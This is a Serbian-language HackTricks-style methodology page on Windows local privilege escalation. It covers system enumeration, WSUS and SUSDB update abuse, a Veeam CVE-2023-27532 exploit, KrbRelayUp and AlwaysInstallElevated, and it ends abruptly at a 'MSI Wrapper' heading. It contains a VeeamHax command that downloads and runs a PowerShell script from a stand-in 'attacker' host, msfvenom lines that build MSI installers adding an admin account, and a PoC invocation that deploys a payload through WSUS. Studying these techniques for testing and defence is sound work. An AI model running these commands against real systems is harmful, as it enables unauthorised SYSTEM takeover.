# Lokalna eskalacija privilegija u Windows-u

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za traženje vektora lokalne eskalacije privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ova stranica objedinjuje opštu metodologiju za eskalaciju privilegija u Windows-u iz nekoliko temeljnih vodiča.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Praktični tok enumeracije oslanja se i na radionice i kontrolne liste zajednice.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Istorijski materijal o napadima obuhvata DerbyCon prezentaciju o eskalaciji privilegija u Windows-u.<sup>[[5]](#references)</sup>

## Osnovna teorija o Windows-u

### Access Tokens

**Ako ne znate šta su Windows access tokens, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL-ovi - DACL-ovi/SACL-ovi/ACE-ovi

**Više informacija o ACL-ovima - DACL-ovima/SACL-ovima/ACE-ovima potražite na sledećoj stranici:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windows-u, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Bezbednosne kontrole u Windows-u

U Windows-u postoje različite stvari koje vam mogu **onemogućiti enumeraciju sistema**, pokretanje izvršnih datoteka ili čak **otkriti vaše aktivnosti**. Pre nego što započnete enumeraciju za eskalaciju privilegija, trebalo bi da **pročitate** sledeću **stranicu** i **enumerišete** sve ove **odbrambene** **mehanizme**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fizički pristup može da omogući i pretvaranje izmene UEFI NVRAM-a van mreže u DMA pre pokretanja sistema i lanac izmena Windows `SYSTEM` memorije:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / tiha elevacija UIAccess-a

UIAccess procesi pokrenuti preko `RAiLaunchAdminProcess` mogu se zloupotrebiti za dostizanje High IL-a bez upita, kada se zaobiđu AppInfo provere bezbedne putanje. Poseban tok rada za zaobilaženje UIAccess/Admin Protection-a pogledajte ovde:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagacija registra pristupačnosti Secure Desktop-a može se zloupotrebiti za proizvoljan upis u SYSTEM registar (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije verzije Windows-a uvele su i LPE putanju preko **SMB-a na proizvoljnom portu**, gde se privilegovana lokalna NTLM autentifikacija reflektuje preko ponovo upotrebljene SMB TCP veze:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li postoje poznate ranjivosti u verziji Windows-a (proverite i primenjene zakrpe).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploiti specifični za verziju

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pretragu detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **ogromnu površinu za napad** koju pruža Windows okruženje.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas sadrži ugrađen watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — prikuplja podatke o verziji OS-a, instaliranim ažuriranjima i potencijalno relevantnim bezbednosnim preporukama; pre nego što rezultat smatrate primenljivim, proverite tačan proizvod i eventualna naknadna ažuriranja koja ga zamenjuju.

Za lokalni exploit specifičan za određenu verziju proverite **arhitekturu pokrenutog procesa**, kao i arhitekturu OS-a. Na 64-bitnom Windowsu, 32-bitni proces podleže [preusmeravanju sistema datoteka WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` se obično odnosi na 32-bitni sistemski direktorijum, dok `%windir%\Sysnative` tom procesu omogućava pristup izvornom sistemskom direktorijumu. Ovaj alias nije dostupan 64-bitnom procesu. Verzija OS-a ili kandidatsko nedostajuće ažuriranje ne dokazuju da je sistem ranjiv na exploit; uporedite pokrenutu verziju, instalirano ili naknadno ažuriranje koje ga zamenjuje, arhitekturu procesa i preduslove exploita sa [Microsoft bezbednosnim biltenom](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) za konkretan problem.

Primer oštećenja memorije servisa potražite u tekstu o [offsetima u prstenastom baferu MIDI deljene memorije kojima upravlja klijent](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Objavljeni offseti steka važe samo za testiranu verziju; dobijanje privilegija `LOCAL SERVICE` razlikuje se od narednog koraka [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) kojim se dobija `SYSTEM`.<sup>[[44]](#references)</sup>

**Lokalno, uz informacije o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repozitorijumi exploita:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su neke akreditive ili vredne informacije sačuvane u promenljivama okruženja?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell istorija

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell datoteke transkripta

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` je samo primer. [Politika transkripcije PowerShell-a](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) obično zapisuje datoteke u fasciklu Documents svakog korisnika, ali podešavanje `OutputDirectory` ili `Start-Transcript -OutputDirectory` može da ih preusmeri u deljenu ili skrivenu fasciklu. Pre pregleda transkripta proverite efektivnu izlaznu putanju i ACL datoteke: transkript može da sadrži argumente komandi i izlaz, uključujući akreditive. Transkript koji možete da pročitate predstavlja trag samo ako njegov sadržaj otkriva upotrebljiv identitet sa višim privilegijama i taj identitet može da se prijavi u relevantnom kontekstu.

### PowerShell Module Logging

Beleže se detalji izvršavanja PowerShell pipeline-a, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, možda neće biti zabeleženi svi detalji izvršavanja i rezultati izlaza.

Da biste ovo omogućili, pratite uputstva u odeljku „Datoteke transkripta“ u dokumentaciji i izaberite **„Module Logging“** umesto **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Da biste prikazali poslednjih 15 događaja iz PowersShell logova, možete da izvršite:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Beleži se potpuna aktivnost i celokupan sadržaj izvršavanja skripte, čime se obezbeđuje dokumentovanje svakog bloka koda tokom njegovog izvršavanja. Ovaj proces čuva sveobuhvatan revizijski trag svake aktivnosti, što je korisno za forenzičku analizu i ispitivanje zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja pruža se detaljan uvid u proces.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Događaje evidentiranja za Script Block možete pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste prikazali poslednjih 20 događaja, možete da koristite:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet podešavanja

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diskovi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Ranije smernice su rizik sažele ovako:

Možete kompromitovati sistem ako se ažuriranja ne zahtevaju preko http**S**, već preko http.

HTTP WSUS endpoint ukazuje na potrebu da se proveri mogućnost presretanja metapodataka o ažuriranjima. Eksploatacija takođe zavisi od toga da li klijent koristi taj WSUS server, da li napadač može da presretne ili kontroliše njegov saobraćaj i od klijentovih pravila za poverenje u ažuriranja i njihovu instalaciju. Sam URL ne omogućava code execution. [Microsoft preporučuje TLS za WSUS metapodatke](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Najpre proverite da li mreža koristi WSUS ažuriranja bez SSL-a tako što ćete u cmd-u pokrenuti sledeće:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ili sledeće u PowerShell-u:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ako dobijete odgovor poput nekog od ovih:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

I ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Originalna izjava o primenljivosti glasila je:

Zatim, **moguće je iskoristiti ranjivost.** Ako je poslednji registar jednak `0`, unos WSUS-a će biti zanemaren.

Kada je `UseWUServer` podešen na `1`, Windows Update koristi konfigurisanu intranet uslugu. Ovo potvrđuje preduslov za putanju presretanja HTTP saobraćaja, ali ne dokazuje da je moguće presretanje, prihvatanje zlonamernih ažuriranja ili instalacija sa povišenim privilegijama. Kada je vrednost `0`, ova konkretna WSUS krajnja tačka konfigurisana ovim pravilom se ne bira.

Da biste iskoristili ove ranjivosti, možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — ovo su weaponized MITM exploit skripte za ubacivanje „lažnih“ ažuriranja u WSUS saobraćaj koji nije zaštićen SSL-om.

Istraživanje možete pročitati ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Kompletan izveštaj pročitajte ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
U suštini, ovo je propust koji ovaj bug iskorišćava:

> Ako možemo da izmenimo proxy podešavanja lokalnog korisnika, a Windows Updates koristi proxy konfigurisan u podešavanjima Internet Explorera, onda možemo lokalno da pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus) kako bismo presreli sopstveni saobraćaj i pokrenuli kod kao korisnik sa povišenim privilegijama na našem sistemu.
>
> Štaviše, pošto WSUS usluga koristi podešavanja trenutnog korisnika, koristiće i njegovo skladište sertifikata. Ako generišemo samopotpisani sertifikat za WSUS hostname i dodamo ga u skladište sertifikata trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme slične HSTS-u za implementaciju provere sertifikata tipa „veruj pri prvom korišćenju“. Ako korisnik veruje predstavljenom sertifikatu i ako on ima ispravan hostname, usluga će ga prihvatiti.

Ovu ranjivost možete iskoristiti alatom [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude dostupan).

### Ažuriranja pod kontrolom WSUS administratora

Postoji zasebna putanja kada trenutni identitet može da **objavljuje i odobrava** ažuriranja na WSUS serveru. Proverite efektivno članstvo u grupi `WSUS Administrators` na serveru i sva delegirana WSUS ovlašćenja, a zatim utvrdite grupu klijenata kojoj bi odobreno ažuriranje bilo isporučeno. [Microsoft zahteva WSUS Administrator privilegije za odobravanje ažuriranja](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), a [dokumentuje i odnos poverenja pri objavljivanju](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klijenti moraju da veruju sertifikatu za potpisivanje koji se koristi za lokalno objavljen sadržaj. Pre nego što ovo smatrate putanjom za eskalaciju privilegija, potvrdite da je potencijalno ažuriranje potpisano i prihvaćeno, da se odnosi na cilj i da se instalira u kontekstu sa višim privilegijama. Sama HTTP vrednost `WUServer` ili naziv grupe ne potvrđuju te uslove.

### Zloupotreba prilagođenih ažuriranja u SUSDB-u: nepotpisani payload-i preko `.txt`/`.esd`

Ovo je drugačiji propust granice poverenja od presretanja HTTP WSUS veze: preduslov je dovoljan pristup **procedurama uskladištenim u WSUS bazi podataka (`SUSDB`)** za objavljivanje i odobravanje prilagođenog ažuriranja. Jedan praktičan način za pristup jeste prosleđivanje naloga računara WSUS servera ka zasebnom MSSQL serveru na kom se nalazi `SUSDB`; tačan preduslov zavisi od konkretne implementacije, zato prvo proverite `EXECUTE` dozvole umesto da pretpostavljate da su potrebna SQL administratorska prava.<sup>[[38]](#references)[[39]](#references)</sup>

Za zasebnu putanju napada kojom se prosleđuje WSUS klijentska autentikacija sa HTTP/8530 ka LDAP-u, SMB-u ili AD CS-u, pogledajte [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Potvrdite prosleđivanje ka eksternoj bazi podataka i prava nad procedurama

U implementacijama u kojima WSUS koristi eksterni SQL Server, prvo proverite da li nalog WSUS servera može da se autentifikuje na bazi podataka i da li NTLM relay može da dosegne taj listener. SQL uloga servera može da omogući pristup procedurama za objavljivanje ažuriranja čak i kada su direktni upisi u tabele zabranjeni; neuspešan `UPDATE` nad `SUSDB` ne dokazuje da je objavljivanje onemogućeno. Pre pokušaja objavljivanja prilagođenog ažuriranja, u ovlašćenoj SQL sesiji proverite efektivni identitet, članstvo u ulogama i dozvole nad procedurama.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Definicije procedura uživo i instalirani `SoftwareDistributionPackage.xsd` korisni su pri rekonstrukciji ispravnih metapodataka ažuriranja. Roditeljski bundle i dete payload moraju svaki da sadrže `UpdateIdentity` (tip fragmenta `1`), `LocalizedProperties` (`4`) i `ExtendedProperties` (`2`); zabeležite lokalni ID revizije koji vraća svaki poziv `spImportUpdate` i održavajte doslednost odnosa bundle-a, digest-a, veličine, URL-a sadržaja i revizije. Ovo je proces objavljivanja sa stanjem, pa uspešan poziv sačuvane procedure sam po sebi ne dokazuje izvršavanje na strani klijenta.<sup>[[38]](#references)</sup>

#### Kreiranje, ciljanje i odobravanje ažuriranja

Tok rada za prilagođeno ažuriranje koristi legitimne WSUS procedure kao ograničeni API za objavljivanje. Važni prelazi stanja su:<sup>[[38]](#references)</sup>

| Faza | Relevantne sačuvane procedure |
| --- | --- |
| Uvoz metapodataka ažuriranja | `spImportUpdate` |
| Čuvanje XML fragmenata za preduslove, lokalizaciju i proširena svojstva | `spSaveXMLFragment` |
| Povezivanje digest-a sadržaja sa URL-om kojim upravlja napadač | `spSetBatchURL` |
| Nabrajanje/kreiranje grupe računara i dodavanje klijenta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Odobravanje instalacije za tu grupu | `spDeployUpdate` sa `@actionID = 0` i `@isAssigned = 1` |

Ime datoteke, digest-i, veličina i handler `CommandLineInstallation` moraju da se podudaraju u uvezenim metapodacima/fragmentima. Po dodeli URL-a sadržaja i ciljne grupe, konačno odobrenje je slično sledećem; koristite nove ID-jeve ažuriranja, grupe i primene umesto da ponovo koristite GUID-ove iz primera.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Zaobilaženje potpisa zasnovano na ekstenziji

WSUS obično odbija proizvoljan nepotpisan izvršni sadržaj. Međutim, u `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, .NET putanja `VerifyFile` postavlja zastavicu provere sertifikata na false kada se prosleđeno ime datoteke završava sa `.txt` ili `.esd`; `CheckCertificateSignature` se zatim preskače, a da se prethodno ne utvrdi da li su bajtovi tekst ili legitimna ESD slika. Zbog toga neizmenjeni PE, nazvan, na primer, `payload.exe.txt`, može proći proveru sadržaja, a zatim ga može pokrenuti rukovalac za instalaciju ažuriranja putem komandne linije. Dakle, ovo je greška zabune politike i tipa, a ne falsifikovanje potpisa.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Postavljanje sadržaja i automatizacija kompatibilni sa BITS-om

Pozivanje funkcije `spDeployUpdate` navodi WSUS da preuzme registrovani sadržaj. Izvor mora da ispunjava HTTP očekivanja BITS-a: sama dostupnost URL-a nije dovoljna jer prenos koristi početni niz `HEAD`/`GET` zahteva i zahteve za opsege bajtova. Server bez podrške za Range izaziva WSUS događaj sinhronizacije `EventId=364`, koji navodi da BITS zahteva zaglavlje protokola Range.<sup>[[39]](#references)</sup>

Istraživački PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiše SQL potreban za lanac import/fragment/URL/group/deployment, uključuje izmenjeni MSSQL klijent za njegovo izvršavanje i sadrži `BitsWebServer.py` za postavljanje sadržaja. Minimalno pokretanje u ovlašćenoj laboratoriji je:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Neinteraktivno izvršavanje i upornost ponovnim pokušajima

Interakcija na strani klijenta zavisi od smernica. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcija `4 - Auto download and schedule install`, omogućava da se odobreno ažuriranje preuzme i instalira prema konfigurisanom rasporedu, bez ručnog izbora korisnika. Tokom testiranja, payload čije ažuriranje nije uspelo ili je ostalo nedovršeno ponovo je odmah ponuđen nakon što se callback proces završio, pa ponašanje pri ponovnim pokušajima može dovesti do upornog ponavljanja izvršavanja; to je upadljivo jer klijent prikazuje stanje neuspelog ažuriranja.<sup>[[39]](#references)</sup>

#### Mogućnosti za detekciju i ojačavanje zaštite

Korisne mogućnosti za proveru na strani servera i klijenta u ovom lancu su:<sup>[[39]](#references)</sup>

- Proverite izvršavanje `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` u `SUSDB`; istražite nove grupe za ciljanje, spoljne izvore sadržaja, payloade za ažuriranje sa ekstenzijama `.txt`/`.esd` i instalacije koje su izvršili neočekivani principal-i (naročito nalozi koji nisu računari).
- Pregledajte `C:\Program Files\Update Services\LogFiles` u potrazi za `ContentSyncAgent`, `FileVerified`, pogrešno napisanim `FileVerficationFailed` i `EventId=364`; uporedite verifikaciju sa ekstenzijom payloada i njegovim stvarnim formatom, umesto da verujete sufiksu.
- Tražite slučajeve kada instalacija Windows Update-a opetovano ne uspeva i pokušava ponovo, kao i PE izvršavanje ili neočekivanu aktivnost podređenih procesa/mreže za sadržaj sa imenima koja se završavaju na `.txt` ili `.esd`.
- Gde je podržano, zahtevajte Extended Protection for Authentication za servis baze podataka i ograničite mrežni pristup bazi podataka na WSUS server i ovlašćene administrativne sisteme. Svedite `EXECUTE` prava nad procedurama za prilagođena ažuriranja na minimum i revidirajte ih.

## Ažurirači trećih strana i Agent IPC (local privesc)

Mnogi poslovni agenti izlažu IPC površinu na localhost adresi i privilegovani kanal za ažuriranje. Ako se registracija može preusmeriti na server napadača, a ažurirač veruje lažnom root CA sertifikatu ili koristi slabe provere potpisnika, lokalni korisnik može isporučiti zlonamerni MSI koji instalira SYSTEM servis. Ovde pogledajte uopštenu tehniku (zasnovanu na Netskope stAgentSvc lancu – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM preko TCP 9401)

Prvobitni opis za određenu verziju i napomena o izviđanju bili su:

Veeam B&R < `11.0.1.1261` izlaže servis na localhost adresi koji sluša na **TCP/9401** i obrađuje poruke pod kontrolom napadača, čime omogućava izvršavanje proizvoljnih komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Izviđanje**: proverite da li port sluša i utvrdite verziju, npr. pomoću `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication i Cloud Connect podrazumevano koriste osnovni servis za rezervno kopiranje na **TCP/9401**. [Veeam-ovo bezbednosno obaveštenje](https://www.veeam.com/kb4424) opisuje neautentifikovano otkrivanje šifrovanih akreditiva baze podataka za konfiguraciju unutar perimetra mreže za rezervno kopiranje; zaseban javni PoC demonstrira putanju do izvršavanja komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Servis možda sluša i na adresama koje nisu localhost, zato proverite njegovu stvarnu adresu i PID.

- **Izviđanje**: potvrdite da TCP/9401 pripada procesu `Veeam.Backup.Service.exe`, a zatim proverite instalirani proizvod i metapodatke zakrpa. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` samo su indikativni, a ne potpuna provera zakrpa.
- **Prve ispravljene verzije**: Veeam navodi **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** kao prve ispravljene verzije; prethodne verzije su pogođene. Četvorodelna verzija datoteke sama po sebi ne može da razlikuje nezakrpljenu osnovnu verziju od kasnije zakrpe na istom broju verzije. Pre nego što verziju na granici proglasite ispravljenom, proverite identifikator zakrpe u [istoriji verzija proizvođača](https://www.veeam.com/kb2680).
- **Eksploatacija**: smestite PoC, kao što je `VeeamHax.exe`, zajedno sa potrebnim Veeam DLL datotekama u isti direktorijum, a zatim pokrenite SYSTEM payload preko lokalnog soketa:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Servis izvršava komandu kao SYSTEM.

Citirani PoC demonstrira izvršavanje komandi kao SYSTEM kada su ispunjeni dodatni preduslovi; savetodavno obaveštenje proizvođača opisuje problem otkrivanja akreditiva.

## KrbRelayUp

Prvobitni opis podrazumevanog okruženja glasio je:

U Windows okruženjima **domena** postoji ranjivost **lokalne eskalacije privilegija** pod određenim uslovima. Ti uslovi obuhvataju okruženja u kojima **potpisivanje LDAP-a nije obavezno**, korisnici imaju samostalna prava koja im omogućavaju da konfigurišu **Resource-Based Constrained Delegation (RBCD)** i mogu da kreiraju računare u domenu. Važno je napomenuti da su ovi **zahtevi** ispunjeni pomoću **podrazumevanih podešavanja**.

Lokalni Kerberos relay može da omogući prelaz sa prijave sa nižim privilegijama na privilegovano upisivanje u direktorijum kada se odgovarajući COM server autentifikuje, a prosleđeni principal ima prava nad ciljnim objektom. [KrbRelay dokumentuje](https://github.com/cube0x0/KrbRelay) LDAP upise za RBCD i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatizuje neke od ovih puteva. RBCD lanac zahteva odgovarajuća prava za delegiranje i nad ciljnim objektom, dok shadow-credential lanac zahteva prava za upis ključa i KDC koji podržava putanju autentifikacije pomoću sertifikata. Nijedna od ovih putanja ne proizlazi samo iz članstva u domenu.

Proverite smernice stvarnog DC-a za [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL objekta prosleđenog identiteta i nivoe autentifikacije i impersonacije izabrane COM klase. Važni su tip prijave pozivaoca i kontekst akreditiva: WinRM sesija može da se ponaša drugačije od interaktivne prijave ili prijave sa novim akreditivima. Zaštitni zid/OXID rutiranje i instalirane ispravke takođe mogu da utiču na ishod. Permisivnu smernicu ili ACL koji odgovara uslovima smatrajte kandidatom za proveru; pasivno nabrajanje ne bi trebalo da pokreće COM coercion, relay autentifikaciju ili upise u direktorijum. Shadow credential naloga računara može da dovede do mašinskog tiketa i, samo ako taj nalog ima potrebna prava za replikaciju direktorijuma, do zasebne DCSync putanje.

Pronađite **exploit u** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ako** su ova 2 ključa registratora **omogućena** (vrednost je **0x1**), korisnici sa bilo kojim nivoom privilegija mogu da **instaliraju** (izvršavaju) datoteke `*.msi` kao NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ako imate meterpreter session, ovu tehniku možete automatizovati pomoću modula **`exploit/windows/local/always_install_elevated`**

### PowerUP

Pomoću komande `Write-UserAddMSI` iz PowerUP-a napravite u trenutnom direktorijumu Windows MSI binarnu datoteku za eskalaciju privilegija. Ova skripta ispisuje unapred kompajliran MSI installer koji traži dodavanje korisnika/grupe (zato će vam biti potreban GUI pristup):

```
Write-UserAddMSI
```

Samo pokrenite kreiranu binarnu datoteku da biste eskalirali privilegije.

### MSI Wrapper

